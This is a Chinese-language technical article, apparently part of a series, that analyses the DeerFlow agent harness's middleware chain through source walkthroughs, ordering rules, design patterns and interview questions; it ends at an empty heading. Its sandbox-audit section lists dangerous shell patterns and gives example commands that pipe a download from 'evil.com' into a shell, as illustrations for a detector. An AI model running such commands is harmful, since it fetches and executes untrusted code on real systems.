# 中间件链架构 — Agent 执行的脊梁

> DeerFlow Agent Harness 深度分析 · 第 1 篇

---

## 1. 概述与定位

### 在整体架构中的位置

中间件链是 DeerFlow Agent Harness 最核心的架构模式。如果说 Lead Agent 是大脑（LLM），工具是双手（Tool），那么中间件链就是神经系统——它包裹在每一次 LLM 调用和工具执行的前后，处理所有横切关注点：安全、记忆、压缩、错误恢复、循环检测、用户交互中断。

```
┌─────────────────────────────────────────────────────────┐
│                    Lead Agent                            │
│  ┌───────────────────────────────────────────────────┐  │
│  │              Middleware Chain (14-18)              │  │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐          │  │
│  │  │ before  │→│  LLM    │→│ after   │          │  │
│  │  │ model   │  │ call    │  │ model   │          │  │
│  │  └─────────┘  └─────────┘  └─────────┘          │  │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐          │  │
│  │  │ wrap    │→│  Tool   │→│ result  │          │  │
│  │  │ tool_call│  │ execute │  │         │          │  │
│  │  └─────────┘  └─────────┘  └─────────┘          │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### 解决的核心问题

在 Agent 系统中，LLM 的推理循环（think → act → observe → think...）需要大量横切逻辑：
- **安全**：命令审计、护栏、循环检测
- **可靠性**：错误恢复、工具异常处理、中断修复
- **效率**：上下文压缩、延迟工具加载
- **可观测性**：Token 用量、标题生成、记忆持久化
- **交互**：澄清中断、用户上传文件注入

如果把这些逻辑散落在 Agent 主循环中，代码将变成不可维护的"大泥球"。中间件链将这些关注点正交分解为独立、可组合、可排序的单元。

### 一句话设计哲学

**"每个横切关注点是一个中间件，中间件的顺序是架构，顺序错了就是 bug。"**

---

## 2. 架构总览

### 2.1 LangChain AgentMiddleware 基类

DeerFlow 的中间件建立在 LangChain 的 `AgentMiddleware[AgentState]` 之上，该基类定义了 6 个钩子点：

```python
class AgentMiddleware(Generic[State]):
    """LangChain agent middleware base class."""

    # Agent 生命周期
    def before_agent(self, state, runtime) -> dict | None: ...
    def after_agent(self, state, runtime) -> dict | None: ...

    # LLM 调用前后
    def before_model(self, state, runtime) -> dict | None: ...
    def after_model(self, state, runtime) -> dict | None: ...

    # 工具调用拦截（洋葱模型）
    def wrap_tool_call(self, request, handler) -> ToolMessage | Command: ...
    async def awrap_tool_call(self, request, handler) -> ToolMessage | Command: ...
```

**钩子执行时序**：

```
before_agent()
  │
  ├── before_model()          ← LLM 调用前
  │     │
  │     ▼
  │   LLM 推理
  │     │
  │     ▼
  ├── after_model()           ← LLM 响应后
  │     │
  │     ├── [模型输出包含 tool_calls]
  │     │     │
  │     │     ├── wrap_tool_call(tool_call_1, handler)
  │     │     │     └── handler() → ToolMessage
  │     │     │
  │     │     ├── wrap_tool_call(tool_call_2, handler)
  │     │     │     └── handler() → ToolMessage
  │     │     │
  │     │     └── ...
  │     │
  │     └── [模型输出纯文本] → 结束
  │
  ▼
after_agent()
```

### 2.2 DeerFlow 完整中间件链

```
 ┌──────────────────────────────────────────────────────────────────────┐
 │                        Middleware Chain                               │
 │                                                                       │
 │  0  ThreadDataMiddleware          创建线程目录（用户隔离）              │
 │  1  UploadsMiddleware             跟踪/注入上传文件                    │
 │  2  SandboxMiddleware             获取/释放沙箱                       │
 │  3  DanglingToolCallMiddleware    修复中断的工具调用                   │
 │  4  LLMErrorHandlingMiddleware    模型错误恢复                        │
 │  5  GuardrailMiddleware           工具调用授权                        │
 │  6  SandboxAuditMiddleware        沙箱命令安全审计                    │
 │  7  ToolErrorHandlingMiddleware   工具异常 → 错误 ToolMessage         │
 │  8  SummarizationMiddleware       上下文压缩（保留技能内容）           │
 │  9  TodoMiddleware                计划模式待办跟踪                    │
 │ 10  TokenUsageMiddleware          Token 用量记录                     │
 │ 11  TitleMiddleware               自动生成对话标题                    │
 │ 12  MemoryMiddleware              异步记忆更新队列                    │
 │ 13  ViewImageMiddleware           注入 base64 图片数据（视觉）        │
 │ 14  DeferredToolFilterMiddleware  隐藏延迟加载工具的 schema           │
 │ 15  SubagentLimitMiddleware       限制并发子智能体数                  │
 │ 16  LoopDetectionMiddleware       检测重复工具调用循环                │
 │ 17  [custom_middlewares]          用户自定义中间件                    │
 │ 18  ClarificationMiddleware       拦截澄清请求 → 中断（必须最后）     │
 │                                                                       │
 └──────────────────────────────────────────────────────────────────────┘
```

### 2.3 中间件分类

| 类别 | 中间件 | 钩子点 | 核心作用 |
|------|--------|--------|---------|
| **基础设施** | ThreadData, Uploads, Sandbox | before_agent / after_agent | 准备执行环境 |
| **健壮性** | DanglingToolCall, LLMError, ToolError | before_model / wrap_tool_call | 错误恢复 |
| **安全** | Guardrail, SandboxAudit, LoopDetection | wrap_tool_call / after_model | 阻止危险行为 |
| **效率** | Summarization, DeferredToolFilter, SubagentLimit | before_model / after_model | 资源管理 |
| **可观测性** | TokenUsage, Title, Memory | after_model / after_agent | 记录与持久化 |
| **交互** | ViewImage, Clarification, Todo | before_model / wrap_tool_call | 用户交互增强 |

---

## 3. 源码走读

### 3.1 中间件组装：`_build_middlewares()`

**文件**：`deerflow/agents/lead_agent/agent.py`

```python
def _build_middlewares(
    config: RunnableConfig,
    model_name: str,
    agent_name: str | None,
    custom_middlewares: list[AgentMiddleware] | None,
    *,
    app_config: AppConfig,
) -> list[AgentMiddleware]:
    """Build the middleware chain for the lead agent."""
    middlewares: list[AgentMiddleware] = []

    # ─── 基础中间件（共享，lead 和 subagent 都有）───
    middlewares.extend(
        build_lead_runtime_middlewares(config, model_name, app_config=app_config)
    )

    # ─── Lead 专属中间件 ───
    # 8. Summarization
    summarization_mw = _create_summarization_middleware(app_config=app_config)
    if summarization_mw:
        middlewares.append(summarization_mw)

    # 9. Todo (plan mode)
    is_plan_mode = _get_runtime_config(config).get("is_plan_mode", False)
    todo_mw = _create_todo_list_middleware(is_plan_mode)
    if todo_mw:
        middlewares.append(todo_mw)

    # 10. Token usage
    middlewares.append(TokenUsageMiddleware())

    # 11. Title
    title_config = app_config.title
    if title_config and title_config.enabled:
        middlewares.append(TitleMiddleware())

    # 12. Memory
    memory_config = app_config.memory
    if memory_config and memory_config.enabled:
        middlewares.append(MemoryMiddleware(agent_name=agent_name, memory_config=memory_config))

    # 13. View image (vision models)
    if _model_supports_vision(model_name, app_config=app_config):
        middlewares.append(ViewImageMiddleware())

    # 14. Deferred tool filter
    tool_search_config = app_config.tool_search
    if tool_search_config and tool_search_config.enabled:
        middlewares.append(DeferredToolFilterMiddleware())

    # 15. Subagent limit
    if _get_runtime_config(config).get("subagent_enabled", False):
        middlewares.append(SubagentLimitMiddleware())

    # 16. Loop detection
    middlewares.append(LoopDetectionMiddleware())

    # 17. Custom middlewares (user-injected)
    if custom_middlewares:
        middlewares.extend(custom_middlewares)

    # 18. Clarification (MUST be last)
    middlewares.append(ClarificationMiddleware())

    return middlewares
```

**关键设计决策**：
1. **共享基础 + 专属扩展**：`build_lead_runtime_middlewares()` 提供 0-7 号基础中间件，lead agent 在此基础上追加 8-18 号
2. **配置驱动**：每个中间件的启用/禁用由 `app_config` 对应字段决定
3. **ClarificationMiddleware 必须最后**：因为它返回 `Command(goto=END)` 中断执行，如果前面还有中间件需要处理，会被跳过

### 3.2 共享基础中间件：`build_lead_runtime_middlewares()`

**文件**：`deerflow/agents/middlewares/tool_error_handling_middleware.py`

```python
def build_lead_runtime_middlewares(
    config: RunnableConfig,
    model_name: str,
    *,
    app_config: AppConfig,
) -> list[AgentMiddleware]:
    """Build the base middlewares shared by lead and subagent agents."""
    middlewares: list[AgentMiddleware] = []

    # 0. ThreadData — must be before Sandbox (needs thread_id)
    middlewares.append(ThreadDataMiddleware())

    # 1. Uploads — after ThreadData (needs thread_id)
    middlewares.append(UploadsMiddleware())

    # 2. Sandbox — after ThreadData (needs thread paths)
    sandbox_provider = get_sandbox_provider(app_config=app_config)
    middlewares.append(SandboxMiddleware(sandbox_provider, lazy_init=True))

    # 3. Dangling tool call fixup
    middlewares.append(DanglingToolCallMiddleware())

    # 4. LLM error handling
    middlewares.append(LLMErrorHandlingMiddleware())

    # 5. Guardrail (config-driven)
    guardrails_config = app_config.guardrails
    if guardrails_config and guardrails_config.enabled:
        provider = _resolve_guardrail_provider(guardrails_config)
        middlewares.append(GuardrailMiddleware(provider, fail_closed=True))

    # 6. Sandbox audit
    middlewares.append(SandboxAuditMiddleware())

    # 7. Tool error handling
    middlewares.append(ToolErrorHandlingMiddleware())

    return middlewares
```

**子智能体版本**：`build_subagent_runtime_middlewares()` 返回相同的 0-7 号中间件，但**不包含** GuardrailMiddleware（子智能体信任父智能体的护栏决策）。

### 3.3 逐个中间件源码分析

#### 3.3.1 ThreadDataMiddleware — 线程目录创建

**钩子**：`before_agent`

**职责**：为每个线程创建独立的文件系统目录，实现用户隔离。

```python
class ThreadDataMiddleware(AgentMiddleware[AgentState]):
    def before_agent(self, state: AgentState, runtime: Runtime) -> dict | None:
        thread_id = runtime.context.get("thread_id") if runtime.context else None
        if not thread_id:
            return None

        # 创建线程目录结构
        user_id = get_effective_user_id()
        thread_dir = get_thread_dir(user_id, thread_id)
        thread_dir.mkdir(parents=True, exist_ok=True)

        outputs_dir = thread_dir / "outputs"
        outputs_dir.mkdir(exist_ok=True)

        uploads_dir = thread_dir / "uploads"
        uploads_dir.mkdir(exist_ok=True)

        return {
            "thread_data": {
                "workspace": str(thread_dir),
                "outputs": str(outputs_dir),
                "uploads": str(uploads_dir),
            }
        }
```

**为什么必须排在最前面**：后续的 SandboxMiddleware、UploadsMiddleware 都依赖 `thread_data` 中的路径信息。

#### 3.3.2 SandboxMiddleware — 沙箱生命周期

**钩子**：`before_agent`（急切）/ 首次工具调用（懒）；`after_agent`（释放）

```python
class SandboxMiddleware(AgentMiddleware[AgentState]):
    def __init__(self, provider: SandboxProvider, lazy_init: bool = True):
        self._provider = provider
        self._lazy_init = lazy_init

    def before_agent(self, state: AgentState, runtime: Runtime) -> dict | None:
        if not self._lazy_init:
            return self._acquire(state, runtime)
        return None  # 延迟到首次工具调用

    def after_agent(self, state: AgentState, runtime: Runtime) -> dict | None:
        sandbox_state = state.get("sandbox")
        if sandbox_state and sandbox_state.get("sandbox_id"):
            self._provider.release(sandbox_state["sandbox_id"])
        return None
```

**懒初始化的设计动机**：并非每次对话都需要沙箱（纯文本问答不需要），懒初始化避免不必要的资源分配。

#### 3.3.3 DanglingToolCallMiddleware — 中断修复

**钩子**：`before_model`

**问题场景**：当 Agent 在工具调用后被中断（用户取消、超时、崩溃），消息历史中会存在没有对应 `ToolMessage` 的 `AIMessage.tool_calls`。LLM 看到这种不一致的历史会报错。

```python
class DanglingToolCallMiddleware(AgentMiddleware[AgentState]):
    def before_model(self, state: AgentState, runtime: Runtime) -> dict | None:
        messages = state.get("messages", [])
        dangling = []

        for msg in messages:
            if isinstance(msg, AIMessage) and msg.tool_calls:
                for tc in msg.tool_calls:
                    # 检查是否有对应的 ToolMessage
                    has_response = any(
                        isinstance(m, ToolMessage) and m.tool_call_id == tc["id"]
                        for m in messages
                    )
                    if not has_response:
                        dangling.append(tc["id"])

        if not dangling:
            return None

        # 为每个悬空工具调用注入占位 ToolMessage
        placeholders = [
            ToolMessage(
                content="Tool call was interrupted. Continue without this result.",
                tool_call_id=tc_id,
            )
            for tc_id in dangling
        ]
        return {"messages": placeholders}
```

**设计洞察**：这是一个"自愈"中间件——它不阻止错误，而是静默修复，让 Agent 继续工作。这种"容错优于报错"的哲学在 Agent 系统中非常重要，因为 LLM 的行为不可预测，中断是常态而非异常。

#### 3.3.4 LLMErrorHandlingMiddleware — 模型错误恢复

**钩子**：`after_model`

**处理策略**：
- `RateLimitError` → 等待后重试
- `AuthenticationError` → 不可恢复，转为用户友好消息
- `BadRequestError`（上下文过长）→ 触发 summarization
- 通用 `Exception` → 转为错误 AIMessage，让 Agent 自行决定下一步

```python
class LLMErrorHandlingMiddleware(AgentMiddleware[AgentState]):
    def after_model(self, state: AgentState, runtime: Runtime) -> dict | None:
        # 检查 state 中是否有 LLM 错误标记
        # 将错误转换为可恢复的 AIMessage
        # 让 Agent 看到错误信息并决定如何处理
        ...
```

#### 3.3.5 GuardrailMiddleware — 护栏

**钩子**：`wrap_tool_call`

```python
class GuardrailMiddleware(AgentMiddleware[AgentState]):
    def __init__(self, provider: GuardrailProvider, fail_closed: bool = True):
        self._provider = provider
        self._fail_closed = fail_closed

    def wrap_tool_call(self, request, handler):
        result = self._provider.evaluate(request.tool_call)
        if result.denied:
            return ToolMessage(
                content=f"Tool call denied: {result.reason}",
                tool_call_id=request.tool_call["id"],
                name=request.tool_call["name"],
            )
        return handler(request)
```

**Fail-closed 设计**：如果 `provider.evaluate()` 抛异常，默认行为是**阻止**调用（安全优先）。这遵循了安全系统的"默认拒绝"原则。

**GuardrailProvider 是 Protocol**：

```python
class GuardrailProvider(Protocol):
    def evaluate(self, tool_call: dict) -> GuardrailResult: ...
    async def aevaluate(self, tool_call: dict) -> GuardrailResult: ...
```

通过 Protocol（而非 ABC），DeerFlow 实现了**结构化子类型**（structural subtyping）——任何实现了 `evaluate`/`aevaluate` 方法的类都可以作为 provider，无需显式继承。

#### 3.3.6 SandboxAuditMiddleware — 命令安全审计

**钩子**：`wrap_tool_call`，仅拦截 `bash` 工具

**两阶段分类算法**：

```python
class SandboxAuditMiddleware(AgentMiddleware[AgentState]):
    # 高风险模式（整命令扫描）
    HIGH_RISK_PATTERNS = [
        r"rm\s+-rf\s+/",           # rm -rf /
        r"curl.*\|\s*sh",          # curl | sh
        r":\(\)\{\s*:\|:&\s*\}",   # fork bomb
        r"LD_PRELOAD",             # 动态链接注入
        r"dd\s+if=.*of=/dev/",     # 设备覆写
    ]

    # 中风险模式（子命令扫描）
    MEDIUM_RISK_PATTERNS = [
        r"pip\s+install",          # 包安装
        r"chmod\s+777",            # 危险权限
        r"sudo\s+",                # 提权
        r"npm\s+install",          # 包安装
    ]

    def wrap_tool_call(self, request, handler):
        if request.tool_call.get("name") != "bash":
            return handler(request)  # 只审计 bash

        command = request.tool_call["args"].get("command", "")

        # 阶段 1：整命令扫描（捕获多语句攻击）
        if self._is_high_risk_whole(command):
            return self._block(request, "High-risk command pattern detected")

        # 阶段 2：子命令逐个分类
        sub_commands = self._split_compound(command)  # 引用感知分割
        for sub in sub_commands:
            risk = self._classify(sub)
            if risk == "block":
                return self._block(request, f"Blocked sub-command: {sub}")
            if risk == "warn":
                # 追加警告，但允许执行
                result = handler(request)
                return self._append_warning(result, sub)

        return handler(request)
```

**引用感知分割**：

```python
def _split_compound(self, command: str) -> list[str]:
    """按 &&, ||, ; 分割，但尊重引号内的分隔符。"""
    parts = []
    current = []
    in_single = False
    in_double = False

    for char in command:
        if char == "'" and not in_double:
            in_single = not in_single
        elif char == '"' and not in_single:
            in_double = not in_double
        # ... 分割逻辑

    if in_single or in_double:
        # 未闭合引号 → 视为可疑整体
        return [command]

    return parts
```

**设计洞察**：两阶段策略是必要的。单靠子命令扫描会漏掉 `curl evil.com | sh` 这种整命令级别的攻击；单靠整命令扫描会漏掉 `cd /tmp && curl evil.com | sh` 这种复合命令中的危险子命令。

#### 3.3.7 ToolErrorHandlingMiddleware — 工具异常兜底

**钩子**：`wrap_tool_call`

```python
class ToolErrorHandlingMiddleware(AgentMiddleware[AgentState]):
    def wrap_tool_call(self, request, handler):
        try:
            return handler(request)
        except GraphBubbleUp:
            raise  # 保留 LangGraph 控制流异常
        except Exception as e:
            # 将异常转为错误 ToolMessage，Agent 循环继续
            return ToolMessage(
                content=f"Tool error: {type(e).__name__}: {e}",
                tool_call_id=request.tool_call["id"],
                name=request.tool_call["name"],
            )
```

**关键细节**：`GraphBubbleUp` 异常不捕获——这是 LangGraph 的控制流机制（如 `Command(goto=END)`），捕获会破坏图执行语义。

#### 3.3.8 DeerFlowSummarizationMiddleware — 上下文压缩

**钩子**：`before_model`

**继承关系**：`DeerFlowSummarizationMiddleware` → `SummarizationMiddleware`（LangChain 内置）

**核心扩展**：

1. **技能救援（Skill Rescue）**：压缩时保留最近加载的技能内容

```python
def _partition_with_skill_rescue(self, messages, cutoff_index):
    """分区后，从待压缩部分中抢救最近的技能包。"""
    to_summarize, preserved = self._partition_messages(messages, cutoff_index)

    # 找到所有技能包（AIMessage + 配套 ToolMessage）
    bundles = self._find_skill_bundles(to_summarize, self._skills_container_path)

    # 按预算选择要保留的包
    rescue_bundles = self._select_bundles_to_rescue(bundles)

    # 将选中的包从 to_summarize 移到 preserved
    ...
```

2. **BeforeSummarizationHook**：压缩前触发钩子

```python
@runtime_checkable
class BeforeSummarizationHook(Protocol):
    def __call__(self, event: SummarizationEvent) -> None: ...
```

记忆系统的 `memory_flush_hook` 就是实现了这个 Protocol——在消息被压缩删除前，将它们冲刷到记忆队列，确保不丢失信息。

3. **摘要消息命名**：

```python
def _build_new_messages(self, summary: str) -> list[HumanMessage]:
    return [HumanMessage(
        content=f"Here is a summary of the conversation to date:\n\n{summary}",
        name="summary"  # ← 特殊 name，前端隐藏但模型可见
    )]
```

#### 3.3.9 LoopDetectionMiddleware — 循环检测

**钩子**：`after_model`

**双层检测算法**：

```python
class LoopDetectionMiddleware(AgentMiddleware[AgentState]):
    def __init__(
        self,
        warn_threshold=3,      # 哈希检测：相同调用 ≥3 次 → 警告
        hard_limit=5,          # 哈希检测：相同调用 ≥5 次 → 强制停止
        window_size=20,        # 滑动窗口大小
        max_tracked_threads=100,  # LRU 逐出上限
        tool_freq_warn=30,     # 频率检测：单工具 ≥30 次 → 警告
        tool_freq_hard_limit=50,  # 频率检测：单工具 ≥50 次 → 强制停止
    ): ...

    def after_model(self, state, runtime):
        warning, hard_stop = self._track_and_check(state, runtime)

        if hard_stop:
            # 剥离 tool_calls，强制文本回答
            last_msg = state["messages"][-1]
            return self._build_hard_stop_update(last_msg, warning)

        if warning:
            # 追加警告到消息内容
            ...

        return None
```

**稳定键派生**（避免误报）：

```python
def _stable_tool_key(name: str, args: dict, fallback_key: str | None) -> str:
    """工具特定的归一化，避免语义相同但参数微小的差异产生不同哈希。"""
    if name == "read_file":
        # 行范围按 200 分桶：read_file(a, 1-200) ≈ read_file(a, 50-250)
        path = args.get("path", "")
        offset = args.get("offset", 0)
        line_bucket = (offset // 200) * 200
        return f"{name}:{path}:{line_bucket}"
    elif name in ("write_file", "str_replace"):
        # 写操作哈希完整参数（内容不同就是不同调用）
        return f"{name}:{json.dumps(args, sort_keys=True)}"
    else:
        return fallback_key or f"{name}:{json.dumps(args, sort_keys=True)}"
```

**强制停止机制**：

```python
@staticmethod
def _build_hard_stop_update(last_msg, content) -> dict:
    """剥离 tool_calls，设置 finish_reason='stop'，强制文本回答。"""
    return {
        "messages": [
            AIMessage(
                content=content,
                tool_calls=[],           # ← 清空工具调用
                additional_kwargs={},    # ← 清除 function_call
                id=last_msg.id,
            )
        ]
    }
```

**线程安全**：每个线程独立的追踪状态，`threading.Lock` 保护，`OrderedDict` LRU 逐出（最多 100 线程）。

#### 3.3.10 ClarificationMiddleware — 澄清中断

**钩子**：`wrap_tool_call`，仅拦截 `ask_clarification`

```python
class ClarificationMiddleware(AgentMiddleware[ClarificationMiddlewareState]):
    def wrap_tool_call(self, request, handler):
        if request.tool_call.get("name") != "ask_clarification":
            return handler(request)  # 非 clarification，放行
        return self._handle_clarification(request)

    def _handle_clarification(self, request) -> Command:
        args = request.tool_call.get("args", {})
        formatted_message = self._format_clarification_message(args)
        tool_call_id = request.tool_call.get("id", "")

        tool_message = ToolMessage(
            id=self._stable_message_id(tool_call_id, formatted_message),
            content=formatted_message,
            tool_call_id=tool_call_id,
            name="ask_clarification",
        )

        # 返回 Command 中断执行
        return Command(
            update={"messages": [tool_message]},
            goto=END,  # ← 中断，等待用户输入
        )
```

**为什么必须排在最后**：`Command(goto=END)` 会立即中断执行流程。如果后面还有中间件需要 `after_model`/`after_agent` 处理，它们会被跳过。因此 ClarificationMiddleware 必须是最后一个，确保前面的中间件都有机会完成工作。

**稳定消息 ID**：

```python
def _stable_message_id(self, tool_call_id, formatted_message) -> str:
    if tool_call_id:
        return f"clarification:{tool_call_id}"
    # 无 tool_call_id 时用 SHA-256，重试调用替换而非追加
    digest = sha256(formatted_message.encode("utf-8")).hexdigest()[:16]
    return f"clarification:{digest}"
```

#### 3.3.11 MemoryMiddleware — 记忆入队

**钩子**：`after_model`

```python
class MemoryMiddleware(AgentMiddleware[AgentState]):
    def __init__(self, agent_name: str | None = None, memory_config: MemoryConfig | None = None):
        self._agent_name = agent_name
        self._memory_config = memory_config

    def after_model(self, state, runtime):
        if not self._memory_config or not self._memory_config.enabled:
            return None

        messages = state.get("messages", [])
        if len(messages) < 2:
            return None

        # 反向查找最后一对 human/AI 消息
        last_ai = None
        last_human = None
        for msg in reversed(messages):
            if last_ai is None and getattr(msg, "type", None) == "ai":
                last_ai = msg
            elif last_human is None and getattr(msg, "type", None) == "human":
                last_human = msg
            if last_ai and last_human:
                break

        if not last_human or not last_ai:
            return None

        thread_id = runtime.context.get("thread_id") if runtime.context else None
        if not thread_id:
            return None

        # 入队，不阻塞
        dispatcher = get_memory_dispatcher()
        dispatcher.enqueue(
            thread_id=thread_id,
            human_message=last_human,
            ai_message=last_ai,
            agent_name=self._agent_name,
        )

        return None  # 不修改 state
```

**关键设计**：
- **不阻塞**：`enqueue()` 是纯入队操作，后台 Timer 处理
- **不修改 state**：返回 `None`，对 Agent 执行无影响
- **为什么用 `after_model` 而非 `after_agent`**：在 `after_model` 中入队，确保每次 LLM 响应都被记录；`after_agent` 只在整个 Agent 循环结束时触发一次

#### 3.3.12 其他中间件简述

| 中间件 | 钩子 | 核心逻辑 |
|--------|------|---------|
| **UploadsMiddleware** | `before_model` | 扫描 `uploaded_files`，将文件内容注入消息上下文 |
| **TokenUsageMiddleware** | `after_model` | 从 LLM 响应的 `usage_metadata` 提取 token 用量，记录到 state |
| **TitleMiddleware** | `after_model` | 首次对话后调用 LLM 生成标题（仅一次） |
| **ViewImageMiddleware** | `before_model` | 将 `viewed_images` 中的 base64 数据注入到对应 HumanMessage |
| **DeferredToolFilterMiddleware** | `before_model` | 从工具列表中移除延迟注册的工具 schema，防止 LLM 直接调用 |
| **SubagentLimitMiddleware** | `after_model` | 如果 `task` 工具调用数 > `MAX_CONCURRENT_SUBAGENTS`，截断多余调用 |
| **TodoMiddleware** | `wrap_tool_call` | 拦截 `write_todos` 工具，更新 `state.todos` |

---

## 4. 核心机制详解

### 4.1 中间件顺序的依赖关系

中间件的顺序不是随意的，存在严格的依赖关系：

```
ThreadData (0)  ──→  Sandbox (2)       # Sandbox 需要 thread_data 中的路径
ThreadData (0)  ──→  Uploads (1)       # Uploads 需要 thread_id
Sandbox (2)     ──→  SandboxAudit (6)  # 审计需要沙箱已就绪
ToolError (7)   ──→  Summarization (8) # 工具错误处理必须在压缩前
Summarization (8) ─→ Memory (12)       # 压缩前触发 memory_flush_hook
Title (11)      ──→  Memory (12)       # 记忆入队前标题已生成
LoopDetection (16)                    # 必须在所有 wrap_tool_call 之后
Clarification (18)                    # 必须绝对最后（goto=END 中断）
```

**如果顺序错误会怎样？**

| 错误顺序 | 后果 |
|---------|------|
| Sandbox 在 ThreadData 前 | `thread_data` 为 None → 沙箱路径解析失败 → 运行时异常 |
| Clarification 不在最后 | 后续中间件的 `after_model`/`after_agent` 被跳过 → 记忆不入队、沙箱不释放 |
| Memory 在 Summarization 前 | 压缩删除消息前记忆未冲刷 → 信息丢失 |
| LoopDetection 在 SandboxAudit 前 | 循环检测可能在审计前截断工具调用 → 危险命令未被审计 |

### 4.2 RuntimeFeatures 三值标志机制

**文件**：`deerflow/agents/features.py`

```python
@dataclass
class RuntimeFeatures:
    sandbox: bool | AgentMiddleware = True
    memory: bool | AgentMiddleware = False
    summarization: Literal[False] | AgentMiddleware = False
    subagent: bool | AgentMiddleware = False
    vision: bool | AgentMiddleware = False
    auto_title: bool | AgentMiddleware = False
    guardrail: Literal[False] | AgentMiddleware = False
```

**三值语义**：

| 值 | 含义 | 效果 |
|----|------|------|
| `False` | 禁用 | 该中间件不加入链 |
| `True` | 默认内置 | 使用 DeerFlow 提供的默认实现 |
| `AgentMiddleware` 实例 | 自定义替换 | 用用户提供的中间件替换默认实现 |

**使用示例**：

```python
# 使用默认配置
features = RuntimeFeatures(sandbox=True, memory=True)

# 禁用记忆
features = RuntimeFeatures(memory=False)

# 自定义护栏
features = RuntimeFeatures(guardrail=MyCustomGuardrailMiddleware())
```

**设计洞察**：三值标志将"是否启用"和"用什么实现"解耦。`True` 表示"我想要这个功能，用默认实现"；`AgentMiddleware` 实例表示"我想要这个功能，用我的实现"。这比传统的 `enabled: bool` + `provider: Class` 两字段配置更简洁。

### 4.3 Next/Prev 锚点装饰器

当用户通过 `custom_middlewares` 注入自定义中间件时，如何确定它在链中的位置？

```python
@Next(SandboxMiddleware)  # 放在 SandboxMiddleware 之后
class MyCustomMiddleware(AgentMiddleware[AgentState]):
    ...

# 或者
@Prev(ClarificationMiddleware)  # 放在 ClarificationMiddleware 之前
class MyOtherMiddleware(AgentMiddleware[AgentState]):
    ...
```

**自动重排序**：组装中间件链时，扫描所有带 `_next_anchor`/`_prev_anchor` 元数据的中间件，在锚点中间件之后/之前插入。重排序后仍然保证 ClarificationMiddleware 在最后。

---

## 5. 设计模式提取

### 5.1 洋葱模型（Onion Model）

`wrap_tool_call` 实现了经典的洋葱模型：

```
Guardrail.wrap_tool_call
  └── SandboxAudit.wrap_tool_call
        └── ToolErrorHandling.wrap_tool_call
              └── Clarification.wrap_tool_call
                    └── handler()  ← 实际工具执行
```

请求从外向内穿透，响应从内向外返回。每一层都可以：
- **短路**：直接返回 `ToolMessage`（如 Guardrail 拒绝）
- **中断**：返回 `Command(goto=END)`（如 Clarification）
- **增强**：修改请求参数或追加响应信息（如 SandboxAudit 追加警告）
- **透传**：调用 `handler(request)` 继续执行

### 5.2 责任链模式（Chain of Responsibility）

整个中间件链是责任链的变体。与经典责任链的区别：
- **经典责任链**：一个请求只被一个处理器处理
- **DeerFlow 中间件链**：每个中间件都处理请求，但可以在不同钩子点

### 5.3 策略模式（Strategy）

GuardrailMiddleware 使用策略模式：`GuardrailProvider` 是策略接口，具体的护栏实现（如基于规则的、基于 LLM 的）是策略实现。Middleware 本身是上下文。

### 5.4 观察者模式（Observer）

BeforeSummarizationHook 是观察者模式的变体：SummarizationMiddleware 是主题，memory_flush_hook 等是观察者。当压缩事件发生时，通知所有观察者。

### 5.5 模板方法模式（Template Method）

DeerFlowSummarizationMiddleware 继承 LangChain 的 SummarizationMiddleware，重写 `_build_new_messages()` 和 `_partition_messages()`。基类定义压缩的骨架流程，子类填充具体细节。

---

## 6. 业界对比

### 6.1 Web 框架中间件对比

| 特性 | DeerFlow | Django | Express (Node) | Koa |
|------|---------|--------|----------------|-----|
| **模型** | 多钩子点（before/after/wrap） | 双向（request/response） | 线性（next()） | 洋葱（await next()） |
| **顺序** | 严格依赖序 | 配置序 | 添加序 | 添加序 |
| **短路** | 返回 ToolMessage/Command | 返回 HttpResponse | 不调用 next() | 不调用 next() |
| **异步** | 原生支持（a* 方法） | Django 5.0+ | 是 | 是 |
| **可组合性** | RuntimeFeatures 三值标志 | MIDDLEWARE 列表 | app.use() | app.use() |

**DeerFlow 的独特之处**：
1. **多钩子点**：Web 框架只有 request/response 两个阶段，Agent 有 before_agent/before_model/after_model/wrap_tool_call/after_agent 五个阶段
2. **工具级拦截**：`wrap_tool_call` 可以拦截单个工具调用，Web 框架没有这种粒度
3. **状态返回**：中间件返回 `dict` 更新 state，而非直接操作 response 对象

### 6.2 Agent 框架中间件对比

| 框架 | 中间件/拦截器机制 | 可扩展性 |
|------|------------------|---------|
| **DeerFlow** | 14-18 个中间件，多钩子点，三值标志 | 高（自定义中间件 + 锚点装饰器） |
| **LangGraph** | 无内置中间件，用 `add_node` 手动编排 | 中（图节点可组合，但无横切抽象） |
| **CrewAI** | 无中间件，callbacks/hooks | 低（仅事件回调，无拦截能力） |
| **AutoGen** | 无中间件，hookable methods | 低（仅 before/after 回调） |
| **Semantic Kernel** | Filters（function/pre/post） | 中（类似 Express 线性链） |

**DeerFlow 的优势**：中间件是"一等公民"——有类型、有顺序、有依赖、可替换、可测试。其他框架的 hooks 通常是"二等公民"——只是回调函数，没有结构化保证。

---

## 7. 面试关联

### Q1: 如何设计一个可扩展的 Agent 中间件系统？

**标准回答框架**：

1. **定义钩子点**：识别 Agent 执行循环中的所有拦截点（LLM 调用前/后、工具执行前/后、Agent 开始/结束）
2. **定义中间件接口**：每个钩子点对应一个方法，接收 state + runtime，返回 state 更新
3. **确定默认顺序**：根据依赖关系排序（基础设施 → 安全 → 业务 → 交互）
4. **提供扩展机制**：允许用户添加/替换/重排序中间件
5. **保证不变量**：某些中间件的位置是硬性约束（如中断型中间件必须在最后）

**加分项（从 DeerFlow 提炼）**：

> "在我分析的 DeerFlow 项目中，中间件系统有三个值得借鉴的设计：一是**三值标志机制**——每个中间件可以禁用(False)、使用默认实现(True)、或替换为自定义实现(AgentMiddleware 实例)，将'是否启用'和'用什么实现'解耦；二是**多钩子点洋葱模型**——不同于 Web 框架的 request/response 两阶段，Agent 需要五个阶段(before_agent/before_model/after_model/wrap_tool_call/after_agent)，其中 wrap_tool_call 实现了工具级拦截，可以短路、中断或增强单个工具调用；三是**锚点装饰器**——用户自定义中间件通过 @Next/@Prev 声明相对位置，系统自动重排序，同时保证关键不变量（如中断型中间件必须在最后）。"

### Q2: 中间件顺序为什么重要？举一个顺序错误导致 bug 的例子。

**标准回答**：

中间件顺序重要因为存在数据依赖和语义依赖。数据依赖是指后面的中间件需要前面中间件产生的数据；语义依赖是指中间件的语义效果依赖于它相对于其他中间件的位置。

**加分项**：

